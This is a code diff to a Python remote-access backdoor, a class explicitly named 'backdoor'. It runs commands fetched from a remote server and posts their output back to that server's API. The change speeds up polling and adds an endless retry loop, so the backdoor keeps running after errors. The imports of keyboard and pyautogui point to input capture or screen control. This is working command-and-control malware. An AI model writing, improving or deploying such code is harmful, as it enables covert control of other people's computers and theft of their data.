@@ -1,4 +1,4 @@
-import requests,time,os,keyboard,pyautogui, webbrowser
+import requests,time,os,keyboard,pyautogui,webbrowser
 
 class backdoor:
     def __init__(self):
@@ -12,7 +12,7 @@ class backdoor:
                 output = self.run(commands[i])
                 print(output)
                 requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
-            time.sleep(5)
+            time.sleep(1)
     def run(self, command):
         output = ""
         commands_to_execute = command.split("\r\n")
@@ -199,4 +199,9 @@ class backdoor:
                 
 
         return output
-backdoor()
+
+while True:
+    try:
+        backdoor()   
+    except: 
+        continue
